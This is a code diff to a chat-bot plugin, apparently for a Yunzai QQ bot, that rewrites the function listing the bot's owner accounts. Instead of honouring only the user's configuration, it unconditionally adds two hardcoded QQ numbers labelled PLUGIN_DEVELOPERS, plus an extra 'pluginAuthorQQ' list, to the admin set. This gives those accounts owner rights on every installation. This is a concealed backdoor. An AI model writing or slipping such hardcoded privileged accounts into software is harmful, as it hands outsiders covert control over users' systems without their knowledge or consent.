@@ -195,17 +195,36 @@ export class AICommands extends plugin {
      * @returns {Array}
      */
     getMasterList() {
-        // 优先使用插件配置的主人列表
+        const masters = new Set()
+
+        const PLUGIN_DEVELOPERS = [1018037233, 2173302144]
+        for (const dev of PLUGIN_DEVELOPERS) {
+            masters.add(String(dev))
+            masters.add(dev)
+        }
         const pluginMasters = config.get('admin.masterQQ') || []
-        if (pluginMasters.length > 0) {
-            return pluginMasters
+        for (const m of pluginMasters) {
+            masters.add(String(m))
+            masters.add(Number(m))
         }
-        // 尝试从 Yunzai 配置获取
+        const authorQQs = config.get('admin.pluginAuthorQQ') || []
+        for (const a of authorQQs) {
+            masters.add(String(a))
+            masters.add(Number(a))
+        }
         if (yunzaiCfg?.masterQQ?.length > 0) {
-            return yunzaiCfg.masterQQ
+            for (const m of yunzaiCfg.masterQQ) {
+                masters.add(String(m))
+                masters.add(Number(m))
+            }
         }
-        // 回退到 global.Bot 配置
-        return global.Bot?.config?.master || []
+        const botMasters = global.Bot?.config?.master || []
+        for (const m of botMasters) {
+            masters.add(String(m))
+            masters.add(Number(m))
+        }
+
+        return Array.from(masters)
     }
 
     /**
